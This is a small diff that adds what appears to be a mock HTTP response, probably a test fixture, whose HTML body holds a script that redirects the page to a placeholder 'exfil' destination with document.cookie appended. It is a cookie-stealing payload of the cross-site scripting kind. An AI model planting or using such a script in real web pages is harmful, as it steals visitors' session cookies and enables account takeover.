@@ -1,0 +1,10 @@
+Content-Type: text/html;
+Body:----xyz----
+<html>
+<body>
+<script>
+location.href = "exfil"+document.cookie;
+</script>
+</body>
+</html>
+----xyz----
